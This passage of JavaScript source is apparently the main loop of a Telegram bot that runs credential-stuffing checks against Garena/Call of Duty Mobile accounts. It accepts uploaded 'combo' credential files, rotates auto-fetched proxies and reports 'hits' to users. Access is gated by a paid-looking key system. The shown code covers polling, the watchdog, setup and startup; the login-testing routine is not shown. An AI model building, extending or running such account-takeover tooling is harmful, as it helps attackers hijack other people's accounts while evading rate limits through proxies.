        d.key_expires  = saved.key_expires || 0;
        d.combo_limit  = saved.combo_limit || config.COMBO_LINE_LIMIT;
        botState[chatId] = 'AWAIT_FILE';
      } else {
        botState[chatId] = 'AWAIT_LEVEL';
      }
    }

    const state = botState[chatId] || 'AWAIT_LEVEL';

    if (state === 'AWAIT_LEVEL') {
      if (text) handleLevel(token, chatId, text);
      else askLevel(token, chatId);
      return;
    }

    if (state === 'AWAIT_FILTER') {
      if (text) handleFilter(token, chatId, text);
      else {
        const d = udata(chatId);
        const lvlLabel = d.level?.[0] === 1 ? 'ALL levels' : `Level ${d.level?.[0]}+`;
        askFilter(token, chatId, lvlLabel);
      }
      return;
    }

    if (state === 'RUNNING') {
      tgSend(token, chatId,
        '⏳ <b>Checker is still running.</b>\nSend /stop to cancel, or wait for it to finish.');
      return;
    }

    if (state === 'AWAIT_FILE') {
      if (msg.document) {
        handleFile(token, chatId, msg, fromUser);
      } else {
        tgSend(token, chatId,
          '📂 Please upload your combo file.\n' +
          "<i>Name must contain 'garena' or 'codm'</i>\n" +
          '(e.g. <code>garena.txt</code>, <code>codm.txt</code>, <code>Yuki_garena.txt</code>)\n' +
          'Or send /start to reset settings.');
      }
    }

  } catch (e) {
    console.error('[BOT] ❌ Unhandled error in update handler:', e);
    try {
      const chatId = (update.message || update.callback_query?.message || {}).chat?.id;
      if (chatId) tgSend(token, chatId, '⚠️ An error occurred. Please try again.');
    } catch {}
  }
}

// ── Long-polling ───────────────────────────────────────────────────────
async function startBotPolling(token) {
  try {
    await axios.post(`https://api.telegram.org/bot${token}/deleteWebhook`, { drop_pending_updates: false });
    console.log('[BOT] Webhook deleted — polling mode active');
  } catch (e) {
    console.warn('[BOT] deleteWebhook failed:', e.message);
  }

  let offset = 0;
  let consecutiveErrors = 0;

  console.log('[BOT] 🤖 Polling started — waiting for users...');

  while (!config.shutdownEvent.isSet()) {
    try {
      const response = await axios.get(
        `https://api.telegram.org/bot${token}/getUpdates`,
        {
          params: { timeout: 30, offset },
          timeout: 35000,
          validateStatus: () => true,
        }
      );

      consecutiveErrors = 0;

      if (response.status === 429) {
        const retryAfter = parseInt(response.headers['retry-after']) || 10;
        console.warn(`[BOT] Polling rate-limited — sleeping ${retryAfter}s`);
        await new Promise(r => setTimeout(r, retryAfter * 1000));
        continue;
      }

      if (response.status === 409) {
        console.warn('[BOT] Conflict (409) — another bot instance running? Retrying in 3s');
        await new Promise(r => setTimeout(r, 3000));
        continue;
      }

      if (response.status !== 200) {
        console.warn(`[BOT] getUpdates HTTP ${response.status} — retrying in 5s`);
        await new Promise(r => setTimeout(r, 5000));
        continue;
      }

      const payload = response.data;
      const updates = payload.result || [];

      for (const upd of updates) {
        offset = upd.update_id + 1;
        handleBotUpdate(token, upd).catch(e => {
          console.error('[BOT] Update error:', e.message);
        });
      }

    } catch (e) {
      if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') continue;

      consecutiveErrors++;
      const wait = Math.min(5 * consecutiveErrors, 30);
      console.warn(`[BOT] Connection error #${consecutiveErrors}: ${e.message} — retrying in ${wait}s`);
      await new Promise(r => setTimeout(r, wait * 1000));

      if (consecutiveErrors >= 3) {
        console.log('[BOT] 🔄 Recreating polling session after repeated errors');
        consecutiveErrors = 0;
      }
    }
  }
}

// ── Memory watchdog ────────────────────────────────────────────────────
function startMemoryWatchdog() {
  const RAILWAY_RAM_MB = 512;
  const interval = setInterval(() => {
    if (config.shutdownEvent.isSet()) {
      clearInterval(interval);
      return;
    }

    const mem = process.memoryUsage();
    const rss = mem.rss / (1024 * 1024);
    const usedPct = (rss / RAILWAY_RAM_MB) * 100;

    const token = config.getBotToken();
    const ownerId = config.getOwnerId();

    if (usedPct >= 90) {
      console.warn(`[WATCHDOG] 🚨 EMERGENCY — RSS ${rss.toFixed(0)}MB / ${RAILWAY_RAM_MB}MB (${usedPct.toFixed(1)}%) — throttling to 1 thread`);
      global.globalSem = new AsyncSemaphore(1);
      try { tgSend(token, ownerId, `🚨 <b>Server RAM Emergency!</b>\n\nRSS at <b>${rss.toFixed(0)}MB / ${RAILWAY_RAM_MB}MB</b>\nThrottled to 1 checker thread.\n<i>Consider /stop some checkers</i>`); } catch {}
    } else if (usedPct >= 80) {
      console.warn(`[WATCHDOG] 🔴 CRITICAL — RSS ${rss.toFixed(0)}MB / ${RAILWAY_RAM_MB}MB (${usedPct.toFixed(1)}%) — throttling to 3 threads`);
      global.globalSem = new AsyncSemaphore(3);
    } else if (usedPct >= 70) {
      console.warn(`[WATCHDOG] 🟡 WARNING — RSS ${rss.toFixed(0)}MB / ${RAILWAY_RAM_MB}MB (${usedPct.toFixed(1)}%) — throttling to 5 threads`);
      global.globalSem = new AsyncSemaphore(5);
    }

    if (global.gc && usedPct >= 70) global.gc();

    // Check liveness — if no activity for 5 minutes, something may be stuck
    const livenessAge = getLivenessAge();
    if (livenessAge > 300) {
      console.warn(`[WATCHDOG] 💓 No liveness touch for ${Math.round(livenessAge)}s — bot may be stuck`);
    }
  }, 8000);
}

// ── Railway heartbeat ──────────────────────────────────────────────────
function startRailwayHeartbeat() {
  setInterval(() => {
    if (config.shutdownEvent.isSet()) return;
    const active = Object.values(botState).filter(s => s === 'RUNNING').length;
    const proxyCount = geoRotator.total;
    const pausedCount = Object.keys(_proxyPausedUsers).length;
    const livenessAge = Math.round(getLivenessAge());
    console.log(`[HEARTBEAT] 💓 Bot alive | ${active} checker(s) | ${proxyCount} proxies | ${pausedCount} paused | liveness ${livenessAge}s`);
  }, 300000);
}

// ═══════════════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════════════
async function main() {
  printBanner();

  // ── Handle missing config: setup wizard or wait loop ────────────────
  let BOT_TOKEN = config.getBotToken();
  let OWNER_ID  = config.getOwnerId();

  if (!BOT_TOKEN || !OWNER_ID) {
    if (config.isRailway() || !process.stdin.isTTY) {
      // Railway / no-TTY mode: wait for env vars
      console.warn('='.repeat(60));
      console.warn('⚠️  BOT_TOKEN and/or OWNER_ID not configured!');
      console.warn('   On Railway/cloud, set these environment variables:');
      console.warn('     BOT_TOKEN    = your Telegram bot token');
      console.warn('     OWNER_ID     = your Telegram numeric user ID');
      console.warn('     OWNER_USERNAME = your Telegram username (optional)');
      console.warn('     KEYSYSTEM_URL = KeyVault API URL (optional)');
      console.warn('     KEYSYSTEM_ADMIN_SECRET = KeyVault admin secret (optional)');
      console.warn('   Bot will wait and retry every 30 seconds...');
      console.warn('='.repeat(60));

      // Wait loop — keep checking for env vars
      while (!BOT_TOKEN || !OWNER_ID) {
        await new Promise(r => setTimeout(r, 30000));
        const env = config.envConfig();
        if (env.bot_token && env.owner_id) {
          BOT_TOKEN = env.bot_token;
          OWNER_ID = env.owner_id;
          // Merge into config
          const cfg = config.loadConfig();
          cfg.bot_token = BOT_TOKEN;
          cfg.owner_id = OWNER_ID;
          config.saveConfig(cfg);
          console.log('[CONFIG] ✅ Environment variables detected — starting bot!');
          break;
        }
        // Also try KeyVault API
        try {
          const api = getKeySystemAPI();
          if (api && api.enabled) {
            const remoteCfg = await api.loadState('bot_config');
            if (remoteCfg?.bot_token && remoteCfg?.owner_id) {
              BOT_TOKEN = remoteCfg.bot_token;
              OWNER_ID = remoteCfg.owner_id;
              const cfg = { ...remoteCfg };
              config.saveConfig(cfg);
              console.log('[CONFIG] ✅ KeyVault config detected — starting bot!');
              break;
            }
          }
        } catch { /* ignore */ }
        console.log('[CONFIG] Still waiting for BOT_TOKEN and OWNER_ID...');
      }
    } else {
      // Interactive mode: run setup wizard
      const readline = require('readline');
      const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

      console.log('\n╔══════════════════════════════════════════════════════════╗');
      console.log('║        🤖  FIRST-RUN SETUP WIZARD               ║');
      console.log('╚══════════════════════════════════════════════════════════╝\n');
      console.log('\x1b[93mNo config.json found — let\'s set up your bot now.\x1b[0m\n');

      // Get bot token
      BOT_TOKEN = await new Promise(resolve => {
        function askToken() {
          rl.question('\x1b[1;37m🔑 Enter your Bot Token (from @BotFather):\x1b[0m\n> ', async (token) => {
            token = token.trim();
            if (!token) {
              console.log('\x1b[91m❌ Token cannot be empty. Try again.\x1b[0m\n');
              askToken();
              return;
            }
            console.log('\x1b[93m⏳ Validating token...\x1b[0m');
            const botInfo = await config.validateToken(token);
            if (botInfo) {
              console.log(`\x1b[92m✅ Token valid! Bot: ${botInfo.first_name} (@${botInfo.username})\x1b[0m\n`);
              resolve(token);
            } else {
              console.log('\x1b[91m❌ Invalid token or Telegram unreachable. Try again.\x1b[0m\n');
              askToken();
            }
          });
        }
        askToken();
      });

      // Get owner ID
      OWNER_ID = await new Promise(resolve => {
        console.log('\x1b[93mℹ️  To find your Telegram ID, message @userinfobot on Telegram.\x1b[0m');
        rl.question('\n\x1b[1;37m🔍 Enter your Telegram numeric ID (numbers only):\x1b[0m\n> ', (idStr) => {
          const id = parseInt(idStr.trim());
          if (isNaN(id)) {
            console.log('\x1b[91m❌ Must be a number. Using 0 — set it later.\x1b[0m');
            resolve(0);
          } else {
            resolve(id);
          }
        });
      });

      // Get owner username (optional)
      const ownerUsername = await new Promise(resolve => {
        rl.question('\n\x1b[1;37m👤 Enter your Telegram username WITHOUT @ (or press Enter to skip):\x1b[0m\n> ', (uname) => {
          resolve(uname.trim().replace(/^@+/, ''));
        });
      });

      rl.close();

      const setupCfg = {
        bot_token: BOT_TOKEN,
        owner_id: OWNER_ID,
        owner_username: ownerUsername,
      };
      config.saveConfig(setupCfg);
      console.log('\n\x1b[1;92m🚀 Setup complete! Starting bot...\x1b[0m\n');
    }
  }

  // ── Signal handling ─────────────────────────────────────────────────
  function gracefulShutdown(signum) {
    console.warn(`[MAIN] Received signal ${signum} — shutting down gracefully...`);
    config.shutdownEvent.set();
    for (const evt of Object.values(stopEvents)) {
      evt.set();
    }
  }
  process.on('SIGTERM', gracefulShutdown);
  process.on('SIGINT', gracefulShutdown);

  // ── Restore proxies from persistent storage ─────────────────────────
  await restoreAllProxies();
  geoRotator.reload(); // reload after restore

  // ── Log proxy status ────────────────────────────────────────────────
  const proxyFileNames = config.getProxyFiles().map(p => path.basename(p));
  console.log(
    `[GEO] Proxy rotator active -> ${geoRotator.currentProxy} ` +
    `(${geoRotator.total} proxies) | Files: ${proxyFileNames.join(', ') || 'none found'}`
  );

  // ── Load saved users ────────────────────────────────────────────────
  loadSavedUsers();

  // ── Start healthcheck server ────────────────────────────────────────
  const port = process.env.PORT;
  if (port) startHealthcheckServer(parseInt(port));

  // ── Start auto-fetch proxy background worker ────────────────────────
  const stopProxyFetcher = startProxyFetcher(geoRotator, {
    onProxiesAvailable: () => {
      resumeProxyPausedUsers(BOT_TOKEN);
    },
    touchLiveness: touchLiveness,
    persistProxies: persistProxies,
  });

  // ── Start Telegram bot ──────────────────────────────────────────────
  cleanupStaleFiles();
  startBotPolling(BOT_TOKEN);
  tgSetCommands(BOT_TOKEN);

  // ── Start watchdog & heartbeat ──────────────────────────────────────
  startMemoryWatchdog();
  startRailwayHeartbeat();

  console.log('🤖 Bot is running!');
  console.log('Flow: /start → level → hit type → upload file → progress bar → hits sent to your ID');
  console.log('New commands: /keysystem, /add_coowner, /remove_coowner, /resetconfig, /stopall');
  console.log('Auto-fetch proxy: ON (30s interval from ' + RAW_PROXY_SOURCES_COUNT + ' source(s))');
  console.log('Press Ctrl+C to stop.\n');

  // Keep main thread alive
  while (!config.shutdownEvent.isSet()) {
    await new Promise(r => setTimeout(r, 1000));
  }
}

const RAW_PROXY_SOURCES_COUNT = 1; // for the banner message

// ── Auto-restart on crash ──────────────────────────────────────────────
(async () => {
  while (true) {
    try {
      config.shutdownEvent.clear();
      await main();
      break;
    } catch (e) {
      if (e.message?.includes('SIGINT') || e.message?.includes('SIGTERM')) break;
      console.error(`✘ Unexpected error: ${e.message} — restarting in 5s...`);
      await new Promise(r => setTimeout(r, 5000));
    }
  }
})();
